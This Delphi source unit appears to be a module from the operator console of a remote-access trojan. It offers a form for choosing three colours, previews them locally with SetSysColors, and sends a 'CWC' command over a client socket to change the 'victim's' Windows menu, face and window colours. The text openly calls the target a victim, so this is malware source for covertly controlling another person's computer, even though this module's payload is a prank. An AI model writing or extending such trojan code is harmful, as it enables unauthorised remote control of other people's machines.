unit ChangeColorsUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ExtCtrls;

type
  TChangeColorsForm = class(TForm)
    Shape1: TShape;
    Shape2: TShape;
    Shape3: TShape;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Button1: TButton;
    ColorDialog: TColorDialog;
    Button2: TButton;
    Button3: TButton;
    procedure Button2Click(Sender: TObject);
    procedure Label1Click(Sender: TObject);
    procedure Label2Click(Sender: TObject);
    procedure Label3Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  ChangeColorsForm: TChangeColorsForm;

implementation

uses Unit2;

{$R *.DFM}

procedure TChangeColorsForm.Button2Click(Sender: TObject);
begin
 Hide;
end;

procedure TChangeColorsForm.Label1Click(Sender: TObject);
begin
 ColorDialog.Color:=Shape1.Brush.Color;
 ColorDialog.Execute;
 Shape1.Brush.Color:=ColorDialog.Color;
end;

procedure TChangeColorsForm.Label2Click(Sender: TObject);
begin
 ColorDialog.Color:=Shape2.Brush.Color;
 ColorDialog.Execute;
 Shape2.Brush.Color:=ColorDialog.Color;
end;

procedure TChangeColorsForm.Label3Click(Sender: TObject);
begin
 ColorDialog.Color:=Shape3.Brush.Color;
 ColorDialog.Execute;
 Shape3.Brush.Color:=ColorDialog.Color;
end;

procedure TChangeColorsForm.Button3Click(Sender: TObject);
var c:array[1..3] of TColor;
    cols:array[1..3] of integer;
    temp:array[1..3] of TColor;
begin
 temp[1]:=GetSysColor(COLOR_MENU);
 temp[2]:=GetSysColor(COLOR_3DFACE);
 temp[3]:=GetSysColor(COLOR_WINDOW);
 c[1]:=ColorToRGB(Shape1.Brush.Color);
 c[2]:=ColorToRGB(Shape2.Brush.Color);
 c[3]:=ColorToRGB(Shape3.Brush.Color);
 cols[1]:=COLOR_MENU;
 cols[2]:=COLOR_3DFACE;
 cols[3]:=COLOR_WINDOW;
 SetSysColors(3,cols,c);
 ShowMessage('this is how the victim''s windows colors will look like'#13#10'press OK to restore your colors [got pretty scared there didn''t you?]');
 SetSysColors(3,cols,temp);
end;

procedure TChangeColorsForm.Button1Click(Sender: TObject);
begin
 Form1.Status.Caption:='changing victim''s windows colors...';
 Form1.ClientSocket.Socket.SendText('CWC'+ColorToString(Shape1.Brush.Color)+';'+ColorToString(Shape2.Brush.Color)+':'+ColorToString(Shape3.Brush.Color));
 Hide;
end;

end.
